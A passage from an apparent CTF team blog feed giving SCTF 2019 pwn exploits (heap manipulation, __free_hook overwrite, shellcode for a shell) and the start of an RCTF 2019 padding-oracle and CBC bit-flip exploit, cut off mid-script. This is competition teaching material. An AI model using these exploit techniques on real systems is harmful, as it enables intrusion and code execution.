class="keyword">def</span> <span class="title">remove</span><span class="params">(idx)</span>:</span></span><br><span class="line">&gt;     p.recvuntil(<span class="string">"Your choice:"</span>)</span><br><span class="line">&gt;     p.sendline(<span class="string">"2"</span>)</span><br><span class="line">&gt;     p.recvuntil(<span class="string">"Input the index:"</span>)</span><br><span class="line">&gt;     p.sendline(str(idx))</span><br><span class="line">&gt; <span class="function"><span class="keyword">def</span> <span class="title">new0</span><span class="params">(size,content)</span>:</span></span><br><span class="line">&gt;     p.recvuntil(<span class="string">"Your choice:"</span>)</span><br><span class="line">&gt;     p.sendline(<span class="string">"1"</span>)</span><br><span class="line">&gt;     p.recvuntil(<span class="string">"Input the size:"</span>)</span><br><span class="line">&gt;     p.sendline(str(size))</span><br><span class="line">&gt;     p.recvuntil(<span class="string">"Input the note:"</span>)</span><br><span class="line">&gt;     p.send(content)</span><br><span class="line">&gt; p.recvuntil(<span class="string">"Welcome to SCTF:"</span>)</span><br><span class="line">&gt; p.sendline(<span class="string">"%a"</span>*<span class="number">5</span>)</span><br><span class="line">&gt; p.recvuntil(<span class="string">"0x0p+00x0p+00x0.0"</span>)</span><br><span class="line">&gt; lib_addr = int(p.recvuntil(<span class="string">"p-10220x"</span>,drop=<span class="keyword">True</span>)+<span class="string">"0"</span>,<span class="number">16</span>) - a.symbols[<span class="string">"_IO_2_1_stdout_"</span>]</span><br><span class="line">&gt; free_hook = a.symbols[<span class="string">"__free_hook"</span>]+lib_addr</span><br><span class="line">&gt; system = lib_addr+a.symbols[<span class="string">"system"</span>]</span><br><span class="line">&gt; <span class="keyword">print</span> hex(lib_addr)</span><br><span class="line">&gt; new0(<span class="number">0x1</span>,<span class="string">" "</span>)</span><br><span class="line">&gt; remove(<span class="number">0</span>)</span><br><span class="line">&gt; remove(<span class="number">0</span>)</span><br><span class="line">&gt; raw_input()</span><br><span class="line">&gt; new0(<span class="number">0x8</span>,p64(free_hook))</span><br><span class="line">&gt; new0(<span class="number">0x10</span>,<span class="string">"\n"</span>)</span><br><span class="line">&gt; </span><br><span class="line">&gt; </span><br><span class="line">&gt; new(<span class="number">24</span>,p64(system))</span><br><span class="line">&gt; new(<span class="number">0x60</span>,<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">&gt; remove(<span class="number">4</span>)</span><br><span class="line">&gt; </span><br><span class="line">&gt; p.interactive()</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><h2><span id="easy_heap">easy_heap</span></h2><blockquote><p>漏洞点在off by null，可以利用unlink控制全局变量改mmap内存为shellcode，</p><p>接着利用控制的区域构造一个fake chunk</p><p>然后free使得它进入unsortedbin，利用控制覆盖低位，指向malloc_hook，</p><p>然后再edit改为mmap的地址就可以getshell了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">&gt; context.arch = <span class="string">"amd64"</span></span><br><span class="line">&gt; context.log_level = <span class="string">"debug"</span></span><br><span class="line">&gt; <span class="comment">#p = process("./easy_heap")#,env=&#123;"LD_PRELOAD":"./libc.so.6"&#125;)</span></span><br><span class="line">&gt; a = ELF(<span class="string">"./easy_heap"</span>)</span><br><span class="line">&gt; e = a.libc</span><br><span class="line">&gt; <span class="keyword">print</span> hex(e.symbols[<span class="string">"puts"</span>])</span><br><span class="line">&gt; p = remote(<span class="string">"132.232.100.67"</span>,<span class="number">10004</span>)</span><br><span class="line">&gt; <span class="comment">#gdb.attach(p)#,"b *0x5555555554a0")</span></span><br><span class="line">&gt; <span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size)</span>:</span></span><br><span class="line">&gt;     p.recvuntil(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line">&gt;     p.sendline(<span class="string">"1"</span>)</span><br><span class="line">&gt;     p.recvuntil(<span class="string">"Size: "</span>)</span><br><span class="line">&gt;     p.sendline(str(size))</span><br><span class="line">&gt; <span class="function"><span class="keyword">def</span> <span class="title">remove</span><span class="params">(idx)</span>:</span></span><br><span class="line">&gt;     p.recvuntil(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line">&gt;     p.sendline(<span class="string">"2"</span>)</span><br><span class="line">&gt;     p.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">&gt;     p.sendline(str(idx))</span><br><span class="line">&gt; <span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,content)</span>:</span></span><br><span class="line">&gt;     p.recvuntil(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line">&gt;     p.sendline(<span class="string">"3"</span>)</span><br><span class="line">&gt;     p.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">&gt;     p.sendline(str(idx))</span><br><span class="line">&gt;     p.recvuntil(<span class="string">"Content: "</span>)</span><br><span class="line">&gt;     p.sendline(content)</span><br><span class="line">&gt; p.recvuntil(<span class="string">"Mmap: "</span>)</span><br><span class="line">&gt; mmap_addr = int(p.recvuntil(<span class="string">"\n"</span>,drop=<span class="keyword">True</span>),<span class="number">16</span>)</span><br><span class="line">&gt; <span class="keyword">print</span> hex(mmap_addr)</span><br><span class="line">&gt; add(<span class="number">0xf8</span>)</span><br><span class="line">&gt; p.recvuntil(<span class="string">"Address 0x"</span>)</span><br><span class="line">&gt; addr = int(p.recvline().strip(),<span class="number">16</span>) - <span class="number">0x202068</span></span><br><span class="line">&gt; add(<span class="number">0xf8</span>)</span><br><span class="line">&gt; add(<span class="number">0x20</span>)</span><br><span class="line">&gt; edit(<span class="number">0</span>,p64(<span class="number">0</span>)+p64(<span class="number">0xf1</span>)+p64(addr+<span class="number">0x202068</span><span class="number">-0x18</span>)+p64(addr+<span class="number">0x202068</span><span class="number">-0x10</span>)+<span class="string">"a"</span>*<span class="number">0xd0</span>+p64(<span class="number">0xf0</span>))</span><br><span class="line">&gt; remove(<span class="number">1</span>)</span><br><span class="line">&gt; edit(<span class="number">0</span>,p64(<span class="number">0</span>)*<span class="number">2</span>+p64(<span class="number">0xf8</span>)+p64(addr+<span class="number">0x202078</span>)+p64(<span class="number">0x140</span>)+p64(mmap_addr))</span><br><span class="line">&gt; edit(<span class="number">1</span>,asm(shellcraft.sh()))</span><br><span class="line">&gt; bss_addr = <span class="number">0x202040</span></span><br><span class="line">&gt; edit(<span class="number">0</span>,p64(addr+<span class="number">0x202090</span>)+p64(<span class="number">0x20</span>)+p64(<span class="number">0x91</span>)+p64(<span class="number">0</span>)*<span class="number">17</span>+p64(<span class="number">0x21</span>)*<span class="number">5</span>)</span><br><span class="line">&gt; remove(<span class="number">1</span>)</span><br><span class="line">&gt; edit(<span class="number">0</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x100</span>)+<span class="string">'\x10'</span>)</span><br><span class="line">&gt; edit(<span class="number">3</span>,p64(mmap_addr))</span><br><span class="line">&gt; add(<span class="number">0x20</span>)</span><br><span class="line">&gt; p.interactive()</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote></blockquote><h1><span id="彩蛋">彩蛋</span></h1><blockquote><p>闲着无聊，写了个将md中的图片外链转为安全客图片链接的脚本：</p><p>请自行替换安全客登陆后的Cookie</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">&gt; #!coding:utf-8</span><br><span class="line">&gt; import sys</span><br><span class="line">&gt; import re</span><br><span class="line">&gt; import requests</span><br><span class="line">&gt; import base64</span><br><span class="line">&gt; import json</span><br><span class="line">&gt; reload(sys)</span><br><span class="line">&gt; sys.setdefaultencoding(&apos;utf8&apos;)</span><br><span class="line">&gt; requests.packages.urllib3.disable_warnings()</span><br><span class="line">&gt;</span><br><span class="line">&gt; Cookie = &apos;PHPSESSID=xxxx; UM_distinctid=xxxx; wordpress_logged_in_de14bfc29164540b0259654d85d7b021=xxxxx&apos;</span><br><span class="line">&gt;</span><br><span class="line">&gt; def open_file():</span><br><span class="line">&gt; file_name = sys.argv[1]</span><br><span class="line">&gt; f = open(file_name,&apos;r&apos;)</span><br><span class="line">&gt; content = f.read()</span><br><span class="line">&gt; f.close()</span><br><span class="line">&gt; return content</span><br><span class="line">&gt;</span><br><span class="line">&gt; def write_file(new_content):</span><br><span class="line">&gt; f = open(&apos;new_content.md&apos;,&apos;w&apos;)</span><br><span class="line">&gt; f.write(new_content)</span><br><span class="line">&gt; f.close()</span><br><span class="line">&gt; </span><br><span class="line">&gt; def get_img_link():</span><br><span class="line">&gt; link_list = []</span><br><span class="line">&gt; file_name = sys.argv[1]</span><br><span class="line">&gt; for line in open(file_name):</span><br><span class="line">&gt; line = line.strip()</span><br><span class="line">&gt; img_link = &apos;&apos;</span><br><span class="line">&gt; if &apos;![&apos; in line and &apos;](http&apos; in line:</span><br><span class="line">&gt; is_link = re.compile(r&apos;[(](.*?)[)]&apos;, re.S)</span><br><span class="line">&gt; img_link = re.findall(is_link, line)[0]</span><br><span class="line">&gt; link_list.append(img_link)</span><br><span class="line">&gt; return link_list</span><br><span class="line">&gt; </span><br><span class="line">&gt; def get_img_base64(link):</span><br><span class="line">&gt; r = requests.get(link,verify=False)</span><br><span class="line">&gt; content = r.content</span><br><span class="line">&gt; img_b64 = base64.b64encode(content)</span><br><span class="line">&gt; return r.status_code,img_b64</span><br><span class="line">&gt;</span><br><span class="line">&gt; def get_anquanke_link(img_base64):</span><br><span class="line">&gt; url = &apos;https://api.anquanke.com/data/v1/file/pic&apos;</span><br><span class="line">&gt; headers = &#123;</span><br><span class="line">&gt; &apos;Origin&apos;: &apos;https://www.anquanke.com&apos;,</span><br><span class="line">&gt; &apos;Referer&apos;: &apos;https://www.anquanke.com/contribute/new&apos;,</span><br><span class="line">&gt; &apos;Content-Type&apos;: &apos;application/json;charset=UTF-8&apos;,</span><br><span class="line">&gt; &apos;Cookie&apos;: Cookie</span><br><span class="line">&gt; </span><br><span class="line">&gt; &#125;</span><br><span class="line">&gt; data = &#123;</span><br><span class="line">&gt; &apos;image&apos;:img_base64</span><br><span class="line">&gt; &#125;</span><br><span class="line">&gt; r = requests.post(url=url,headers=headers,data=json.dumps(data),verify=False)</span><br><span class="line">&gt; result = r.text</span><br><span class="line">&gt; # print r.text</span><br><span class="line">&gt; anquanke_link = json.loads(result)[&apos;url&apos;]</span><br><span class="line">&gt; return r.status_code,anquanke_link</span><br><span class="line">&gt; </span><br><span class="line">&gt; def change_paper_link():</span><br><span class="line">&gt; content = open_file()</span><br><span class="line">&gt; link_list = get_img_link()</span><br><span class="line">&gt; for link in link_list:</span><br><span class="line">&gt; print &apos;change link: &apos; + link</span><br><span class="line">&gt; status_code,img_b64 = get_img_base64(link)</span><br><span class="line">&gt; if status_code == 200:</span><br><span class="line">&gt; print &apos;get img_base64 success&apos;</span><br><span class="line">&gt; status_code,anquanke_link = get_anquanke_link(img_b64)</span><br><span class="line">&gt; if status_code == 200:</span><br><span class="line">&gt; print &apos;get anquanke_link success: &apos; + anquanke_link</span><br><span class="line">&gt; content = content.replace(link,anquanke_link)</span><br><span class="line">&gt; else:</span><br><span class="line">&gt; print &apos;get anquanke_link fail: &apos; + anquanke_link</span><br><span class="line">&gt; else:</span><br><span class="line">&gt; print &apos;get img_base64 fail&apos;</span><br><span class="line">&gt; return content</span><br><span class="line">&gt; </span><br><span class="line">&gt; def main():</span><br><span class="line">&gt; new_content = change_paper_link()</span><br><span class="line">&gt; write_file(new_content)</span><br><span class="line">&gt; print &apos;get your new paper: new_content.md&apos;</span><br><span class="line">&gt; </span><br><span class="line">&gt; main()</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p>运行输出 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&gt; &gt;&gt;&gt; python .\change_paper_link.py SCTF2019-Writeup-De1ta.md</span><br><span class="line">&gt;</span><br><span class="line">&gt; change link: https://upload-images.jianshu.io/upload_images/7373593-2975fcf7003b7d74.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240</span><br><span class="line">&gt; get img_base64 success</span><br><span class="line">&gt; get anquanke_link success: https://p0.ssl.qhimg.com/t01382fc4f593a308ce.png</span><br><span class="line">&gt; ------------------------</span><br><span class="line">&gt; change link: https://upload-images.jianshu.io/upload_images/7373593-ef36939bde16bbb0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240</span><br><span class="line">&gt; get img_base64 success</span><br><span class="line">&gt; get anquanke_link success: https://p0.ssl.qhimg.com/t01f32c3e4f38589eb6.png</span><br><span class="line">&gt; ------------------------</span><br><span class="line">&gt; get your new paper: new_content.md</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;de1ta-team&quot;&gt;&lt;strong&gt;De1ta-Team&lt;/strong&gt;&lt;/h1&gt;
    
    </summary>
    
    
      <category term="ctf" scheme="https://blog.de1ta.com/tags/ctf/"/>
    
      <category term="re" scheme="https://blog.de1ta.com/tags/re/"/>
    
      <category term="web" scheme="https://blog.de1ta.com/tags/web/"/>
    
      <category term="crypto" scheme="https://blog.de1ta.com/tags/crypto/"/>
    
      <category term="pwn" scheme="https://blog.de1ta.com/tags/pwn/"/>
    
      <category term="misc" scheme="https://blog.de1ta.com/tags/misc/"/>
    
      <category term="writeup" scheme="https://blog.de1ta.com/tags/writeup/"/>
    
      <category term="sctf" scheme="https://blog.de1ta.com/tags/sctf/"/>
    
  </entry>
  
  <entry>
    <title>RCTF 2019 Writeup</title>
    <link href="https://blog.de1ta.com/2019/05/21/RCTF-De1ta/"/>
    <id>https://blog.de1ta.com/2019/05/21/RCTF-De1ta/</id>
    <published>2019-05-21T13:38:00.000Z</published>
    <updated>2020-05-07T04:29:53.820Z</updated>
    
    <content type="html"><![CDATA[<h1><span id="de1ta-team"><strong>De1ta-Team</strong></span></h1><a id="more"></a><blockquote><p>Team：De1ta</p></blockquote><!-- toc --><ul><li><a href="#crypto">Crypto</a><ul><li><a href="#baby_crypto">baby_crypto</a></li></ul></li><li><a href="#web">WEB</a><ul><li><a href="#nextphp">nextphp</a></li><li><a href="#jail">jail</a></li></ul></li><li><a href="#re">RE</a><ul><li><a href="#babyre">babyre</a></li><li><a href="#babyre2">babyre2</a></li><li><a href="#donteatme">DontEatMe</a></li><li><a href="#asm">asm</a></li><li><a href="#crack">crack</a></li><li><a href="#sourceguardian">sourceguardian</a></li></ul></li><li><a href="#pwn">PWN</a><ul><li><a href="#babyheap">babyheap</a></li><li><a href="#shellcoder">shellcoder</a></li><li><a href="#many_notes">many_notes</a></li></ul></li><li><a href="#misc">Misc</a><ul><li><a href="#printer">Printer</a></li><li><a href="#draw">draw</a></li><li><a href="#welcome">Welcome</a></li></ul></li></ul><!-- tocstop --><h2><span id="crypto">Crypto</span></h2><h3><span id="baby_crypto">baby_crypto</span></h3><p><strong>前一半是padding-Oracle + CBC翻转</strong></p><p><strong>后面要绕过sha1的校验，哈希长度扩增好像行不通</strong></p><p><strong>前一半大概是这样</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = "debug"</span></span><br><span class="line"></span><br><span class="line">target = remote(<span class="string">"45.76.208.70"</span>, <span class="number">20000</span>)</span><br><span class="line"></span><br><span class="line">target.sendlineafter(<span class="string">"Input username:\n"</span>, <span class="string">"twings"</span>)</span><br><span class="line">target.sendlineafter(<span class="string">"Input password:\n"</span>, <span class="string">"twings"</span>)</span><br><span class="line">target.recvuntil(<span class="string">"Your cookie:\n"</span>)</span><br><span class="line">data = target.recvuntil(<span class="string">"\n"</span>, drop=<span class="keyword">True</span>)</span><br><span class="line">success(<span class="string">"Cipher: %s"</span> % data)</span><br><span class="line"></span><br><span class="line">iv = data[:<span class="number">32</span>].decode(<span class="string">"hex"</span>)</span><br><span class="line">cipher = data[<span class="number">32</span>:<span class="number">-40</span>].decode(<span class="string">"hex"</span>)</span><br><span class="line">hv_hex = data[<span class="number">-40</span>:].decode(<span class="string">"hex"</span>)</span><br><span class="line">success(<span class="string">"iv: %s"</span> % iv.encode(<span class="string">"hex"</span>))</span><br><span class="line">success(<span class="string">"cipher: %s"</span> % cipher.encode(<span class="string">"hex"</span>))</span><br><span class="line">success(<span class="string">"hv_hex: %s"</span> % hv_hex.encode(<span class="string">"hex"</span>))</span><br><span class="line"></span><br><span class="line">middle = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># padding Oracle</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> xrange(<span class="number">1</span>, <span class="number">17</span>):</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> xrange(<span class="number">0</span>, <span class="number">256</span>):</span><br><span class="line">IV = <span class="string">"\x00"</span> * (<span class="number">16</span> - x) + chr(y) + <span class="string">""</span>.join(chr(ord(i) ^ x) <span class="keyword">for</span> i <span class="keyword">in</span> middle)</span><br><span class="line">        payload = IV.encode(<span class="string">"hex"</span>) + cipher[:<span class="number">16</span>].encode(<span class="string">"hex"</span>) + hv_hex.encode(<span class="string">"hex"</span>)</span><br><span class="line">        target.recvuntil(<span class="string">"Input your cookie:\n"</span>)</span><br><span class="line">target.sendline(payload)</span><br><span class="line">result = target.recvuntil(<span class="string">"\n"</span>, drop=<span class="keyword">True</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="string">"Invalid hash"</span> <span class="keyword">in</span> result:</span><br><span class="line">    middle = chr(y ^ x) + middle</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"[!]Get: "</span> + middle.encode(<span class="string">"hex"</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="keyword">if</span> y == <span class="number">255</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"[!]Error"</span></span><br><span class="line">    exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># CBC</span></span><br><span class="line">fake_iv = <span class="string">""</span></span><br><span class="line">i_need = <span class="string">"admin:1;username"</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">    fake_iv += chr(ord(i_need[x]) ^ ord(middle[x]))</span><br><span class="line">payload = fake_iv.encode(<span class="string">"hex"</span>) + cipher.encode(<span class="string">"hex"</span>) + hv_hex.encode(<span class="string">"hex"</span>)</span><br><span class="line">target.recvuntil(<span class="string">"Input your cookie:\n"</span>)</span><br><span class="line">target.sendline(payload)</span><br><span class="line"></span><br><span class="line">target.interactive()</span><br><span class="line">target.close()</span><br></pre></td></tr></table></figure><p><strong>但是翻转前面的0为1，sha1的校验不知道怎么过了</strong></p><p><strong>或许要换个思路?</strong></p><p><strong>好像不需要paddingOracle...要翻转直接翻转就可以了</strong></p><p><a href="https://www.freebuf.com/articles/web/84498.html" target="_blank" rel="noopener">**https://www.freebuf.com/articles/web/84498.html**</a></p><p><strong>0x04部分👆 沙雕例子。。。。。iv=key</strong> Twings师傅提供一个思路，看起来更可行：</p><p>我们需要伪造的最后一块明文是 ;admin:1 所以我们可以选取其中一块密文，用它的解密中间值跟这个我们需要的明文异或 ，得到上一块的密文;然后通过paddingOracle得到上一块密文的解密中间值，跟我们需要的明文的48-64位异或，得到上上块的密文;以此类推，最后伪装iv，我们就可以伪造全套可以进行哈希长度扩展攻击的明文了 <img src="https://lh5.googleusercontent.com/Bu-KdJ8euE3KBgoOzuHk_XILsuHnkU2BxOKiwxLoJ6MhxMZtgkc68tHpT2JaWzYAsxIVqU3FQaUjFvxmRYpRtwBqPwhzvyiQivaY2NWu49YSbUbpekPckflFNc40jmzo4amnx0gG" alt="img"> 灵魂画手 <img src="https://lh3.googleusercontent.com/Hxr7ae7fctCMwAxJ8CtIafMuXkQk4i_0CxonDarJP1u-Gg2jtlc3c7rSLgytkBUhx8XdArDV60Lg8OCbYsrffghU9mUv9z2ClRuP3za-HwIW_wudmFfWYUK4aMZz_hBz1fBqGbuB" alt="img"> 最后的exp： <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = "debug"</span></span><br><span class="line"></span><br><span class="line">target = remote(<span class="string">"111.231.100.117"</span>, <span class="number">20000</span>)</span><br><span class="line"></span><br><span class="line">target.sendlineafter(<span class="string">"Input username:\n"</span>, <span class="string">"twings"</span>)</span><br><span class="line"></span><br><span class="line">target.sendlineafter(<span class="string">"Input password:\n"</span>, <span class="string">"twings"</span>)</span><br><span class="line"></span><br><span class="line">target.recvuntil(<span class="string">"Your cookie:\n"</span>)</span><br><span class="line"></span><br><span class="line">data = target.recvuntil(<span class="string">"\n"</span>, drop=<span class="keyword">True</span>)</span><br><span class="line"></span><br><span class="line">success(<span class="string">"Cipher: %s"</span> % data)</span><br><span class="line"></span><br><span class="line">iv = data[:<span class="number">32</span>].decode(<span class="string">"hex"</span>)</span><br><span class="line"></span><br><span class="line">cipher = data[<span class="number">32</span>:<span class="number">-40</span>].decode(<span class="string">"hex"</span>)</span><br><span class="line"></span><br><span class="line">hv_hex = data[<span class="number">-40</span>:].decode(<span class="string">"hex"</span>)</span><br><span class="line"></span><br><span class="line">success(<span class="string">"iv: %s"</span> % iv.encode(<span class="string">"hex"</span>))</span><br><span class="line"></span><br><span class="line">success(<span class="string">"cipher: %s"</span> % cipher.encode(<span class="string">"hex"</span>))</span><br><span class="line"></span><br><span class="line">success(<span class="string">"hv_hex: %s"</span> % hv_hex.encode(<span class="string">"hex"</span>))</span><br><span class="line"></span><br><span class="line">fake_cipher = <span class="string">""</span></span><br><span class="line"></span><br><span class="line">i_need = <span class="string">"admin:0;username:twings;password:twings\x80\x00\x00\x00\x00\x00\x00\x01\xb8"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span><span class="params">(a, b)</span>:</span></span><br><span class="line"></span><br><span class="line">​    <span class="keyword">assert</span> len(a) == len(b)</span><br><span class="line"></span><br><span class="line">​    result = <span class="string">""</span></span><br><span class="line"></span><br><span class="line">​    <span class="keyword">for</span> x <span class="keyword">in</span> range(len(a)):</span><br><span class="line"></span><br><span class="line">​        result += chr(ord(a[x]) ^ ord(b[x]))</span><br><span class="line"></span><br><span class="line">​    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="comment"># padding Oracle</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">padding_oracle</span><span class="params">(c)</span>:</span></span><br><span class="line"></span><br><span class="line">​    middle = <span class="string">""</span></span><br><span class="line"></span><br><span class="line">​    <span class="keyword">for</span> x <span class="keyword">in</span> xrange(<span class="number">1</span>, <span class="number">17</span>):</span><br><span class="line"></span><br><span class="line">​        <span class="keyword">for</span> y <span class="keyword">in</span> xrange(<span class="number">0</span>, <span class="number">256</span>):</span><br><span class="line"></span><br><span class="line">​    IV = <span 